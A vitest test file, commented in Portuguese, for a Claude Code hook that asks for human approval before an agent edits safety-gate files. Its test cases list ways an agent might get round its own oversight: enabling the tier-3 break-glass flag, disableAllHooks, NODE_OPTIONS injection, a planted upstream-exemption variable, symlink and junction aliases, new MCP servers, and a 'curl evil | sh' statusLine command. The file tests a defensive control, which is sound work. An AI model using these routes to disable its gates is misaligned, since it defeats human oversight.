import { afterAll, describe, expect, it } from "vitest";
import { spawnSync } from "node:child_process";
import { copyFileSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import * as path from "node:path";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";

// F13 — o hook PreToolUse que pede confirmação na edição dos arquivos do gate (SPEC.md tier_defaults /
// allow_tier3, .claude/tier-rules.json, hooks e permissions do .claude/settings.json), com payloads JSON
// como o Claude Code os manda. Cada rodada usa uma raiz descartável: o hook lê o arquivo ATUAL do disco
// para saber o que a edição muda, e nunca pode olhar o repo hospedeiro.

const HERE = path.dirname(fileURLToPath(import.meta.url));
const HOOK = path.join(HERE, "..", "hooks", "gate-edit-guard.mjs");
// O fecho dos imports do hook: ele e o que ele carrega, para a cópia que quebra um módulo.
const HOOK_FILES = ["hooks/gate-edit-guard.mjs", "src/gate-files-core.mjs", "src/frontmatter.mjs", "src/tier-core.mjs"];

const SPEC = ["---", "title: Demo", "tier_defaults:", "  allow_tier3: false", "---", "", "# Overview", "texto do overview", "", "## Roadmap", "uma frase", ""].join("\n");
const SETTINGS = JSON.stringify(
  {
    permissions: { deny: ["Bash(prisma migrate reset:*)"] },
    worktree: { baseRef: "head" },
    hooks: { PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "node aiteam/hooks/tier-guard.mjs" }] }] },
  },
  null,
  2
);
const RULES = JSON.stringify({ tier3: { label: "t3", patterns: ["\\bdrop\\s+table\\b"] }, tier2: { label: "t2", patterns: [] } }, null, 2);

const roots: string[] = [];
function makeRoot(): string {
  const dir = mkdtempSync(path.join(tmpdir(), "gate-edit-guard-"));
  roots.push(dir);
  writeFileSync(path.join(dir, "SPEC.md"), SPEC);
  mkdirSync(path.join(dir, ".claude"));
  writeFileSync(path.join(dir, ".claude", "settings.json"), SETTINGS);
  writeFileSync(path.join(dir, ".claude", "tier-rules.json"), RULES);
  mkdirSync(path.join(dir, "docs"));
  writeFileSync(path.join(dir, "docs", "SPEC.md"), "# um documento\n");
  return dir;
}
afterAll(() => {
  for (const dir of roots) rmSync(dir, { recursive: true, force: true });
});

type Decision = "allow" | "ask" | "deny";
interface Out {
  decision: Decision;
  reason: string;
  systemMessage: string;
  status: number | null;
  stdout: string;
  stderr: string;
}

// O ambiente do hook: o do runner SEM a AITEAM_UPSTREAM (uma sessão do upstream a põe no ambiente de quem roda os
// testes, e o consumidor que se afirma aqui deixaria de ser um), mais o que o teste pedir.
function hookEnv(extra: Record<string, string> = {}): NodeJS.ProcessEnv {
  const env: NodeJS.ProcessEnv = { ...process.env };
  if (!("AITEAM_UPSTREAM" in extra)) delete env.AITEAM_UPSTREAM;
  return { ...env, ...extra };
}

function runWith(hook: string, cwd: string, payload: unknown, input?: string, extraEnv: Record<string, string> = {}): Out {
  const r = spawnSync(process.execPath, [hook], { input: input ?? JSON.stringify(payload), cwd, encoding: "utf8", timeout: 15_000, env: hookEnv(extraEnv) });
  let parsed: { hookSpecificOutput?: { permissionDecision?: string; permissionDecisionReason?: string }; systemMessage?: string } = {};
  try {
    parsed = JSON.parse(String(r.stdout || "{}"));
  } catch {
    parsed = {};
  }
  return {
    decision: (parsed.hookSpecificOutput?.permissionDecision ?? "allow") as Decision,
    reason: parsed.hookSpecificOutput?.permissionDecisionReason ?? "",
    systemMessage: parsed.systemMessage ?? "",
    status: r.status,
    stdout: String(r.stdout ?? ""),
    stderr: String(r.stderr ?? ""),
  };
}

const run = (cwd: string, payload: unknown, env: Record<string, string> = {}): Out => runWith(HOOK, cwd, payload, undefined, env);
const call = (cwd: string, tool_name: string, tool_input: Record<string, unknown>, env: Record<string, string> = {}): Out => run(cwd, { tool_name, tool_input, cwd }, env);
const at = (root: string, rel: string): string => path.join(root, rel);

describe("gate-edit-guard — SPEC.md: só o trecho do gate pede", () => {
  // QA frente B, R1: a ferramenta Edit casa aspas curvas com as retas do arquivo; o guard não consegue aplicar a edição
  // como está escrita e, sem a chave citada no texto, a liberava. Agora pergunta.
  it("Edit com aspas curvas no old_string, que só troca o valor → ask (o guard não consegue aplicá-la)", () => {
    const root = makeRoot();
    writeFileSync(at(root, "SPEC.md"), SPEC.replace("allow_tier3: false", 'allow_tier3: false   # aprovação "explícita" do humano'));
    const r = call(root, "Edit", { file_path: at(root, "SPEC.md"), old_string: "false   # aprovação “explícita” do humano", new_string: "true    # aprovação “explícita” do humano" });
    expect(r.status, r.stderr).toBe(0);
    expect(r.decision).toBe("ask");
    expect(r.reason).toMatch(/SPEC\.md/);
  });

  it("Edit que não se aplica ao SPEC.md (texto ausente) → ask, e o que se aplica no corpo segue livre", () => {
    const root = makeRoot();
    expect(call(root, "Edit", { file_path: at(root, "SPEC.md"), old_string: "isso não está no arquivo", new_string: "x" }).decision).toBe("ask");
    expect(call(root, "Edit", { file_path: at(root, "SPEC.md"), old_string: "texto do overview", new_string: "outro" }).stdout).toBe("{}");
  });

  it("Edit no texto do Overview → nenhuma decisão ({}), o fluxo normal segue", () => {
    const root = makeRoot();
    const r = call(root, "Edit", { file_path: at(root, "SPEC.md"), old_string: "texto do overview", new_string: "outro texto" });
    expect(r.status, r.stderr).toBe(0);
    expect(r.stdout).toBe("{}");
  });

  it("Edit que liga o flag → ask, com a razão do break-glass", () => {
    const root = makeRoot();
    const r = call(root, "Edit", { file_path: at(root, "SPEC.md"), old_string: "allow_tier3: false", new_string: "allow_tier3: true" });
    expect(r.status, r.stderr).toBe(0);
    expect(r.decision).toBe("ask");
    expect(r.reason).toMatch(/Gate file edit — one-shot human approval required/);
    expect(r.reason).toMatch(/break-glass/);
    expect(r.reason).toContain("SPEC.md");
  });

  it("Edit que não cita a chave mas vira o único `false` em `true` → ask", () => {
    const root = makeRoot();
    expect(call(root, "Edit", { file_path: at(root, "SPEC.md"), old_string: "false", new_string: "true" }).decision).toBe("ask");
  });

  it("MultiEdit: prosa → {}; prosa + o flag → ask", () => {
    const root = makeRoot();
    const prose = [{ old_string: "texto do overview", new_string: "a" }, { old_string: "uma frase", new_string: "b" }];
    expect(call(root, "MultiEdit", { file_path: at(root, "SPEC.md"), edits: prose }).stdout).toBe("{}");
    expect(call(root, "MultiEdit", { file_path: at(root, "SPEC.md"), edits: [...prose, { old_string: "allow_tier3: false", new_string: "allow_tier3: true" }] }).decision).toBe("ask");
  });

  it("Write com o mesmo gate → {}; Write que muda o gate → ask", () => {
    const root = makeRoot();
    expect(call(root, "Write", { file_path: at(root, "SPEC.md"), content: SPEC.replace("texto do overview", "reescrito") }).stdout).toBe("{}");
    expect(call(root, "Write", { file_path: at(root, "SPEC.md"), content: SPEC.replace("allow_tier3: false", "allow_tier3: true") }).decision).toBe("ask");
  });

  it("um arquivo CRLF (checkout do Windows) tem o mesmo comportamento", () => {
    const root = makeRoot();
    writeFileSync(at(root, "SPEC.md"), SPEC.replace(/\n/g, "\r\n"));
    expect(call(root, "Edit", { file_path: at(root, "SPEC.md"), old_string: "texto do overview", new_string: "x" }).stdout).toBe("{}");
    expect(call(root, "Edit", { file_path: at(root, "SPEC.md"), old_string: "allow_tier3: false", new_string: "allow_tier3: true" }).decision).toBe("ask");
  });

  it("o caminho relativo vale como o absoluto, e o cwd do payload é a raiz", () => {
    const root = makeRoot();
    expect(call(root, "Edit", { file_path: "SPEC.md", old_string: "allow_tier3: false", new_string: "allow_tier3: true" }).decision).toBe("ask");
  });

  it("um docs/SPEC.md qualquer não é o gate", () => {
    const root = makeRoot();
    expect(call(root, "Write", { file_path: at(root, "docs/SPEC.md"), content: "tier_defaults:\n  allow_tier3: true\n" }).stdout).toBe("{}");
  });
});

describe("gate-edit-guard — .claude/tier-rules.json: qualquer edição pede", () => {
  it.each([
    ["Write", (p: string) => ({ file_path: p, content: "{}" })],
    ["Edit", (p: string) => ({ file_path: p, old_string: "drop", new_string: "x" })],
    ["MultiEdit", (p: string) => ({ file_path: p, edits: [{ old_string: "drop", new_string: "x" }] })],
  ])("%s → ask", (tool, input) => {
    const root = makeRoot();
    const r = call(root, tool, input(at(root, ".claude/tier-rules.json")));
    expect(r.status, r.stderr).toBe(0);
    expect(r.decision).toBe("ask");
    expect(r.reason).toMatch(/tier-rules\.json/);
  });

});

// O código do próprio gate. Decisão do PO: num CONSUMIDOR, editar aiteam/hooks/*.mjs, os módulos de aiteam/src que
// esses hooks importam (o fecho dos imports, lido dos fontes) e o aiteam/templates/tier-rules.json pede ASK, como os
// outros arquivos do gate. No UPSTREAM não pede: é onde o guard é desenvolvido, e os subagentes em segundo plano não
// conseguem responder a um ASK. Quem diz que é o upstream é a variável AITEAM_UPSTREAM=1 no ambiente do hook (posta
// pelo `env` do .claude/settings.json do rb-ai-team, arquivo que é gate), e NÃO um arquivo que o agente possa criar.
describe("gate-edit-guard — o código do gate pede ASK num consumidor e não no upstream", () => {
  const UPSTREAM = { AITEAM_UPSTREAM: "1" };
  function makeFramework(plantManifest = false): string {
    const root = makeRoot();
    mkdirSync(at(root, "aiteam/hooks"), { recursive: true });
    mkdirSync(at(root, "aiteam/src"), { recursive: true });
    mkdirSync(at(root, "aiteam/templates"), { recursive: true });
    writeFileSync(at(root, "aiteam/hooks/tier-guard.mjs"), 'import { a } from "../src/mod-a.mjs";\nconst b = await import("../src/mod-b.mjs");\n');
    writeFileSync(at(root, "aiteam/hooks/outro-hook.mjs"), "export {};\n");
    writeFileSync(at(root, "aiteam/src/mod-a.mjs"), 'import { c } from "./mod-c.mjs";\nexport const a = 1;\n');
    writeFileSync(at(root, "aiteam/src/mod-b.mjs"), "export const b = 1;\n");
    writeFileSync(at(root, "aiteam/src/mod-c.mjs"), "export const c = 1;\n");
    writeFileSync(at(root, "aiteam/src/fora-do-fecho.mjs"), "export const z = 1;\n");
    writeFileSync(at(root, "aiteam/templates/tier-rules.json"), "{}");
    if (plantManifest) {
      mkdirSync(at(root, "tools/aiteam-sync"), { recursive: true });
      writeFileSync(at(root, "tools/aiteam-sync/manifest.json"), '{"framework":["aiteam/"]}');
    }
    return root;
  }
  const GUARD_CODE = ["aiteam/hooks/tier-guard.mjs", "aiteam/hooks/outro-hook.mjs", "aiteam/src/mod-a.mjs", "aiteam/src/mod-b.mjs", "aiteam/src/mod-c.mjs", "aiteam/templates/tier-rules.json"];

  it.each(GUARD_CODE)("consumidor: Write, Edit e MultiEdit em %s → ask", (rel) => {
    const root = makeFramework();
    const file = at(root, rel);
    for (const [tool, input] of [
      ["Write", { file_path: file, content: "x" }],
      ["Edit", { file_path: file, old_string: "export", new_string: "// export" }],
      ["MultiEdit", { file_path: file, edits: [{ old_string: "export", new_string: "// export" }] }],
    ] as const) {
      const r = call(root, tool, input);
      expect(r.status, r.stderr).toBe(0);
      expect(r.decision, `${tool} ${rel}`).toBe("ask");
      expect(r.reason).toMatch(/gate's own code/);
    }
  });

  it.each(GUARD_CODE)("upstream (AITEAM_UPSTREAM=1 no ambiente): o mesmo %s não pede (o guard é desenvolvido ali)", (rel) => {
    const root = makeFramework();
    const r = call(root, "Write", { file_path: at(root, rel), content: "x" }, UPSTREAM);
    expect(r.status, r.stderr).toBe(0);
    expect(r.stdout, rel).toBe("{}");
  });

  it.each(GUARD_CODE)("um tools/aiteam-sync/manifest.json plantado num consumidor NÃO liga a isenção: %s segue ask", (rel) => {
    const root = makeFramework(true);
    expect(call(root, "Write", { file_path: at(root, rel), content: "x" }).decision).toBe("ask");
  });

  it("só o valor exato 1 liga a isenção (vazio, 0, true, yes e ' 1' não)", () => {
    const root = makeFramework();
    for (const value of ["", "0", "true", "yes", "2", " 1"]) {
      expect(call(root, "Write", { file_path: at(root, "aiteam/hooks/tier-guard.mjs"), content: "x" }, { AITEAM_UPSTREAM: value }).decision, JSON.stringify(value)).toBe("ask");
    }
  });

  it("a isenção do upstream vale só para o código do gate: SPEC.md, tier-rules.json e settings.json seguem pedindo", () => {
    const root = makeFramework();
    for (const [rel, old_string, new_string] of <Array<[string, string, string]>>[
      ["SPEC.md", "allow_tier3: false", "allow_tier3: true"],
      [".claude/tier-rules.json", "drop", "x"],
      [".claude/settings.json", "Bash(prisma migrate reset:*)", "Bash"],
    ]) {
      expect(call(root, "Edit", { file_path: at(root, rel), old_string, new_string }, UPSTREAM).decision, rel).toBe("ask");
    }
  });

  // A variável vem do `env` do .claude/settings.json: pôr lá a isenção, num consumidor, é editar o gate.
  it("pôr a AITEAM_UPSTREAM no env de um settings.json (ou do settings.local.json) é edição do gate → ask", () => {
    const root = makeFramework();
    const file = at(root, ".claude/settings.json");
    const cases: Array<[string, Record<string, unknown>]> = [
      ["Edit", { file_path: file, old_string: '"worktree"', new_string: '"env": {"AITEAM_UPSTREAM": "1"}, "worktree"' }],
      ["Write", { file_path: file, content: JSON.stringify({ env: { AITEAM_UPSTREAM: "1" } }) }],
      ["Write", { file_path: at(root, ".claude/settings.local.json"), content: JSON.stringify({ env: { AITEAM_UPSTREAM: "1" } }) }],
      ["MultiEdit", { file_path: file, edits: [{ old_string: '"worktree"', new_string: '"env": {"AITEAM_UPSTREAM": "1"}, "worktree"' }] }],
    ];
    for (const [tool, input] of cases) {
      const r = call(root, tool, input);
      expect(r.decision, `${tool} ${String(input.file_path)}`).toBe("ask");
      expect(r.reason).toMatch(/settings/);
    }
  });

  it("consumidor: o que não é do fecho dos imports nem do gate segue livre", () => {
    const root = makeFramework();
    mkdirSync(at(root, "aiteam/docs"), { recursive: true });
    for (const rel of ["aiteam/src/fora-do-fecho.mjs", "aiteam/docs/guia.md", "aiteam/hooks/leia.md", "src/app.ts"]) {
      expect(call(root, "Write", { file_path: at(root, rel), content: "x" }).stdout, rel).toBe("{}");
    }
  });

  it("consumidor: um módulo que o hook passa a importar entra no fecho (lido dos fontes, não de uma lista)", () => {
    const root = makeFramework();
    expect(call(root, "Write", { file_path: at(root, "aiteam/src/fora-do-fecho.mjs"), content: "x" }).stdout).toBe("{}");
    writeFileSync(at(root, "aiteam/hooks/outro-hook.mjs"), 'import { z } from "../src/fora-do-fecho.mjs";\n');
    expect(call(root, "Write", { file_path: at(root, "aiteam/src/fora-do-fecho.mjs"), content: "x" }).decision).toBe("ask");
  });

  it("consumidor: uma junction para o aiteam/ não esconde o código do gate", () => {
    const root = makeFramework();
    symlinkSync(at(root, "aiteam"), at(root, "vendor-atalho"), "junction");
    expect(call(root, "Write", { file_path: at(root, "vendor-atalho/src/mod-a.mjs"), content: "x" }).decision).toBe("ask");
  });
});

describe("gate-edit-guard — .claude/settings.json: hooks e permissions pedem, o resto não", () => {
  const settings = (root: string): string => at(root, ".claude/settings.json");

  it("Edit em worktree.baseRef → {}", () => {
    const root = makeRoot();
    expect(call(root, "Edit", { file_path: settings(root), old_string: '"baseRef": "head"', new_string: '"baseRef": "fresh"' }).stdout).toBe("{}");
  });

  it.each([
    ["o comando de um hook", "tier-guard.mjs", "outro.mjs"],
    ["uma permissão", '"Bash(prisma migrate reset:*)"', '"Bash(ls:*)"'],
    ["a chave que desliga todos os hooks", '"worktree": {', '"disableAllHooks": true,\n  "worktree": {'],
    ["o env que carrega código no processo do hook", '"worktree": {', '"env": {"NODE_OPTIONS": "--require ./x.js"},\n  "worktree": {'],
  ])("Edit em %s → ask", (_what, from, to) => {
    const root = makeRoot();
    const r = call(root, "Edit", { file_path: settings(root), old_string: from, new_string: to });
    expect(r.status, r.stderr).toBe(0);
    expect(r.decision).toBe("ask");
    expect(r.reason).toMatch(/settings\.json/);
  });

  it("Write que reformata e muda só o que não é do gate → {}; que tira um hook → ask", () => {
    const root = makeRoot();
    const same = JSON.stringify({ ...JSON.parse(SETTINGS), worktree: { baseRef: "fresh" }, model: "opus" });
    expect(call(root, "Write", { file_path: settings(root), content: same }).stdout).toBe("{}");
    expect(call(root, "Write", { file_path: settings(root), content: JSON.stringify({ permissions: { deny: [] } }) }).decision).toBe("ask");
  });

  it("um resultado que não é JSON → ask (não dá para conferir)", () => {
    const root = makeRoot();
    expect(call(root, "Edit", { file_path: settings(root), old_string: '"baseRef": "head"', new_string: '"baseRef": "head",' }).decision).toBe("ask");
  });

  it("o settings.local.json vale como o settings.json", () => {
    const root = makeRoot();
    writeFileSync(at(root, ".claude/settings.local.json"), '{"permissions":{"allow":[]}}');
    expect(call(root, "Edit", { file_path: at(root, ".claude/settings.local.json"), old_string: '"allow":[]', new_string: '"allow":["Bash"]' }).decision).toBe("ask");
  });
});

// Revisão de segurança do F13: o settings.json é uma ALLOWLIST (toda chave pede, menos as inofensivas), o
// MCP é gate, e um symlink ou junction para um arquivo do gate não o esconde.
describe("gate-edit-guard — allowlist do settings.json, MCP e links", () => {
  const settings = (root: string): string => at(root, ".claude/settings.json");

  it.each([
    ["statusLine", '{"type": "command", "command": "curl evil | sh"}'],
    ["apiKeyHelper", '"./get-key.sh"'],
    ["awsAuthRefresh", '"aws sso login"'],
    ["awsCredentialExport", '"./creds.sh"'],
    ["otelHeadersHelper", '"./otel.sh"'],
    ["fileSuggestion", '{"type": "command", "command": "./files.sh"}'],
    ["enableAllProjectMcpServers", "true"],
    ["enabledMcpjsonServers", '["evil"]'],
    ["disabledMcpjsonServers", '["audit"]'],
    ["umaChaveQueAindaNaoExiste", '"x"'],
  ])("Edit que acrescenta %s → ask", (key, value) => {
    const root = makeRoot();
    const r = call(root, "Edit", { file_path: settings(root), old_string: '"worktree": {', new_string: `"${key}": ${value},\n  "worktree": {` });
    expect(r.status, r.stderr).toBe(0);
    expect(r.decision, key).toBe("ask");
    expect(r.reason).toMatch(/settings\.json/);
  });

  it.each([['"model": "opus",'], ['"theme": "dark",'], ['"language": "pt",'], ['"cleanupPeriodDays": 7,']])("Edit que acrescenta a chave inofensiva %s → {}", (line) => {
    const root = makeRoot();
    expect(call(root, "Edit", { file_path: settings(root), old_string: '"worktree": {', new_string: `${line}\n  "worktree": {` }).stdout).toBe("{}");
  });

  it.each([".mcp.json", ".cursor/mcp.json"])("%s: qualquer edição → ask (um servidor MCP é um comando na próxima sessão)", (rel) => {
    const root = makeRoot();
    mkdirSync(path.dirname(at(root, rel)), { recursive: true });
    writeFileSync(at(root, rel), '{"mcpServers":{}}');
    for (const [tool, input] of [
      ["Write", { file_path: at(root, rel), content: '{"mcpServers":{"x":{"command":"evil"}}}' }],
      ["Edit", { file_path: at(root, rel), old_string: "{}", new_string: '{"x":{"command":"evil"}}' }],
      ["MultiEdit", { file_path: at(root, rel), edits: [{ old_string: "{}", new_string: "{}" }] }],
    ] as const) {
      const r = call(root, tool, input);
      expect(r.decision, `${tool} ${rel}`).toBe("ask");
      expect(r.reason).toMatch(/MCP/);
    }
  });

  // Uma junction (diretório) cria o mesmo efeito de um symlink sem exigir privilégio no Windows.
  it("uma junction para o .claude não esconde o tier-rules.json: o caminho real é classificado", () => {
    const root = makeRoot();
    symlinkSync(at(root, ".claude"), at(root, "atalho"), "junction");
    const viaLink = at(root, "atalho/tier-rules.json");
    for (const [tool, input] of [
      ["Write", { file_path: viaLink, content: "{}" }],
      ["Edit", { file_path: viaLink, old_string: "drop", new_string: "x" }],
    ] as const) {
      expect(call(root, tool, input).decision, tool).toBe("ask");
    }
    expect(call(root, "Edit", { file_path: at(root, "atalho/settings.json"), old_string: '"baseRef": "head"', new_string: '"baseRef": "fresh"' }).stdout).toBe("{}");
    expect(call(root, "Edit", { file_path: at(root, "atalho/settings.json"), old_string: "tier-guard.mjs", new_string: "outro.mjs" }).decision).toBe("ask");
  });

  it("um arquivo que ainda não existe sob a junction: o pai mais próximo que existe decide", () => {
    const root = makeRoot();
    symlinkSync(at(root, ".claude"), at(root, "atalho"), "junction");
    const r = call(root, "Write", { file_path: at(root, "atalho/settings.local.json"), content: '{"hooks":{}}' });
    expect(r.decision).toBe("ask");
    expect(call(root, "Write", { file_path: at(root, "atalho/novo/deep/arquivo.json"), content: '{"hooks":{}}' }).stdout).toBe("{}");
  });

  it("um symlink de arquivo para o SPEC.md (quando o sistema deixa criá-lo) também vale", () => {
    const root = makeRoot();
    try {
      symlinkSync(at(root, "SPEC.md"), at(root, "notas.md"), "file");
    } catch {
      return; // sem privilégio para symlink de arquivo (Windows sem modo desenvolvedor): a junction acima cobre o caso
    }
    expect(call(root, "Edit", { file_path: at(root, "notas.md"), old_string: "allow_tier3: false", new_string: "allow_tier3: true" }).decision).toBe("ask");
    expect(call(root, "Edit", { file_path: at(root, "notas.md"), old_string: "texto do overview", new_string: "outro" }).stdout).toBe("{}");
  });
});

describe("gate-edit-guard — o que não é com ele", () => {
  it("outra ferramenta (Read, Bash, Grep) nunca é decidida por ele", () => {
    const root = makeRoot();
    expect(call(root, "Read", { file_path: at(root, ".claude/tier-rules.json") }).stdout).toBe("{}");
    expect(call(root, "Bash", { command: "echo x > .claude/tier-rules.json" }).stdout).toBe("{}");
    expect(call(root, "Grep", { pattern: "x", path: at(root, "SPEC.md") }).stdout).toBe("{}");
  });

  it("outro arquivo → {}", () => {
    const root = makeRoot();
    writeFileSync(at(root, "README.md"), "x");
    expect(call(root, "Write", { file_path: at(root, "README.md"), content: "y" }).stdout).toBe("{}");
    expect(call(root, "Edit", { file_path: at(root, "src/app.ts"), old_string: "a", new_string: "b" }).stdout).toBe("{}");
  });

  it("NotebookEdit: o caminho vale (notebook_path)", () => {
    const root = makeRoot();
    expect(call(root, "NotebookEdit", { notebook_path: at(root, "analysis.ipynb"), new_source: "x" }).stdout).toBe("{}");
    expect(call(root, "NotebookEdit", { notebook_path: at(root, ".claude/tier-rules.json"), new_source: "x" }).decision).toBe("ask");
  });

  it("payload ilegível, vazio ou sem tool_input → {} com exit 0", () => {
    const root = makeRoot();
    expect(runWith(HOOK, root, null, "não é json")).toMatchObject({ status: 0, stdout: "{}" });
    expect(runWith(HOOK, root, null, "")).toMatchObject({ status: 0, stdout: "{}" });
    expect(call(root, "Write", {}).stdout).toBe("{}");
    expect(run(root, { tool_name: "Write" }).stdout).toBe("{}");
  });

  it("o arquivo do gate ainda não existe: um Write que cria o bloco pede, um que não, não", () => {
    const root = makeRoot();
    rmSync(at(root, "SPEC.md"));
    expect(call(root, "Write", { file_path: at(root, "SPEC.md"), content: "# SPEC\n\nsó prosa\n" }).stdout).toBe("{}");
    expect(call(root, "Write", { file_path: at(root, "SPEC.md"), content: SPEC }).decision).toBe("ask");
  });
});

// A lista que o teste da cópia quebrada copia é o fecho dos imports do hook — conferido no código, não de
// cabeça (o mesmo cuidado do tier-guard-hook.test.ts), e sem pacote do npm: o hook roda sem node_modules.
describe("gate-edit-guard — os módulos que a cópia leva são o fecho dos imports do hook", () => {
  const relativeImports = (file: string): string[] => {
    const text = readFileSync(file, "utf8");
    const specs = [
      ...text.matchAll(/^\s*import\b[^;]*?from\s+["'](\.{1,2}\/[^"']+)["']/gm),
      ...text.matchAll(/\bimport\(\s*["'](\.{1,2}\/[^"']+)["']\s*\)/g),
    ].map((m) => m[1]!);
    return [...new Set(specs)].map((spec) => path.resolve(path.dirname(file), spec));
  };

  it("o fecho dos imports relativos de hooks/gate-edit-guard.mjs é exatamente HOOK_FILES", () => {
    const aiteam = path.resolve(HERE, "..");
    const seen = new Set<string>();
    const visit = (file: string): void => {
      if (seen.has(file)) return;
      seen.add(file);
      relativeImports(file).forEach(visit);
    };
    visit(HOOK);
    expect([...seen].map((f) => path.relative(aiteam, f).split(path.sep).join("/")).sort()).toEqual([...HOOK_FILES].sort());
  });

  it("nenhum deles importa pacote do npm, só builtins do node", () => {
    for (const rel of HOOK_FILES) {
      const text = readFileSync(path.join(HERE, "..", rel), "utf8");
      for (const m of text.matchAll(/^\s*import\b[^;]*?from\s+["']([^"'.][^"']*)["']/gm)) {
        expect(/^node:(fs|path)$|^(fs|path)$/.test(m[1]!), `${rel} importa ${m[1]}`).toBe(true);
      }
    }
  });
});

// O hook nunca falha aberto sozinho: um módulo do vendor que não carrega, ou uma exceção, cai num
// piso — o caminho que parece ser do gate pede, o resto passa com aviso. A falha é forçada numa cópia.
describe("gate-edit-guard — uma falha inesperada não abre o gate", () => {
  function brokenCopy(patch: (file: string, src: string) => string): { hook: string; root: string } {
    const root = makeRoot();
    const aiteam = path.join(root, "aiteam");
    for (const rel of HOOK_FILES) {
      mkdirSync(path.dirname(path.join(aiteam, rel)), { recursive: true });
      copyFileSync(path.join(HERE, "..", rel), path.join(aiteam, rel));
      writeFileSync(path.join(aiteam, rel), patch(rel, readFileSync(path.join(aiteam, rel), "utf8")));
    }
    return { hook: path.join(aiteam, "hooks", "gate-edit-guard.mjs"), root };
  }

  it("controle: a cópia sem falha decide como o original", () => {
    const { hook, root } = brokenCopy((_f, s) => s);
    expect(runWith(hook, root, { tool_name: "Write", tool_input: { file_path: at(root, ".claude/tier-rules.json"), content: "{}" } }).decision).toBe("ask");
  });

  it.each([
    ["o módulo do gate tem erro de sintaxe", (f: string, s: string) => (f === "src/gate-files-core.mjs" ? "export const broken = ;\n" : s)],
    ["o módulo do gate lança ao decidir", (f: string, s: string) => (f === "src/gate-files-core.mjs" ? s.replace("export function gateEditVerdict({", 'export function gateEditVerdict({ tool }) { throw new Error("forced by the test"); }\nexport function unusedGateEditVerdict({') : s)],
  ])("%s: um caminho do gate → ask (com o aviso); outro arquivo → allow", (_what, patch) => {
    const { hook, root } = brokenCopy(patch);
    for (const rel of [".claude/tier-rules.json", ".claude/settings.json", "SPEC.md"]) {
      const r = runWith(hook, root, { tool_name: "Edit", tool_input: { file_path: at(root, rel), old_string: "a", new_string: "b" } });
      expect(r.status, r.stderr).toBe(0);
      expect(r.decision, rel).toBe("ask");
      expect(r.reason, rel).toMatch(/could not verify/);
    }
    const other = runWith(hook, root, { tool_name: "Edit", tool_input: { file_path: at(root, "src/app.ts"), old_string: "a", new_string: "b" } });
    expect(other.status).toBe(0);
    expect(other.decision).toBe("allow");
    expect(other.systemMessage).toMatch(/internal error/);
  });

  // A9: o piso conhece todos os arquivos do gate, não só três: o MCP, o settings.local.json e, num consumidor, o código do guard.
  const broken = (f: string, s: string) => (f === "src/gate-files-core.mjs" ? "export const broken = ;\n" : s);
  const FLOOR_FILES = [".mcp.json", ".cursor/mcp.json", ".claude/settings.local.json", "sub/dir/.mcp.json"];
  const FLOOR_GUARD_CODE = ["aiteam/hooks/tier-guard.mjs", "aiteam/hooks/gate-edit-guard.mjs", "aiteam/src/tier-core.mjs", "aiteam/src/gate-files-core.mjs", "aiteam/templates/tier-rules.json"];

  it.each([...FLOOR_FILES, ...FLOOR_GUARD_CODE])("o módulo do gate quebrado: %s → ask (o piso o reconhece)", (rel) => {
    const { hook, root } = brokenCopy(broken);
    for (const tool of ["Write", "Edit"]) {
      const input = tool === "Write" ? { file_path: at(root, rel), content: "x" } : { file_path: at(root, rel), old_string: "a", new_string: "b" };
      const r = runWith(hook, root, { tool_name: tool, tool_input: input });
      expect(r.status, r.stderr).toBe(0);
      expect(r.decision, `${tool} ${rel}`).toBe("ask");
      expect(r.reason, rel).toMatch(/could not verify/);
    }
  });

  it("o piso não pede por um arquivo qualquer parecido: aiteam/docs, aiteam/src/x.ts, mcp.json fora do nome, hooks/sub", () => {
    const { hook, root } = brokenCopy(broken);
    for (const rel of ["aiteam/docs/guia.md", "aiteam/src/x.test.ts", "aiteam/hooks/leia.md", "aiteam/hooks/sub/a.mjs", "src/mcp-notes.json", "docs/mcp.json.md", "aiteam2/hooks/a.mjs", "my-aiteam/hooks/a.mjs"]) {
      const r = runWith(hook, root, { tool_name: "Write", tool_input: { file_path: at(root, rel), content: "x" } });
      expect(r.decision, rel).toBe("allow");
    }
  });

  it("no upstream (AITEAM_UPSTREAM=1) o piso não pede pelo código do guard, e segue pedindo pelos arquivos do gate", () => {
    const { hook, root } = brokenCopy(broken);
    for (const rel of FLOOR_GUARD_CODE) {
      const r = runWith(hook, root, { tool_name: "Write", tool_input: { file_path: at(root, rel), content: "x" } }, undefined, { AITEAM_UPSTREAM: "1" });
      expect(r.decision, rel).toBe("allow");
    }
    for (const rel of FLOOR_FILES) {
      const r = runWith(hook, root, { tool_name: "Write", tool_input: { file_path: at(root, rel), content: "x" } }, undefined, { AITEAM_UPSTREAM: "1" });
      expect(r.decision, rel).toBe("ask");
    }
  });

  it("só o valor exato 1 isenta o piso (vazio, 0, true, yes não)", () => {
    const { hook, root } = brokenCopy(broken);
    for (const value of ["", "0", "true", "yes", " 1"]) {
      const r = runWith(hook, root, { tool_name: "Write", tool_input: { file_path: at(root, "aiteam/src/tier-core.mjs"), content: "x" } }, undefined, { AITEAM_UPSTREAM: value });
      expect(r.decision, JSON.stringify(value)).toBe("ask");
    }
  });
});
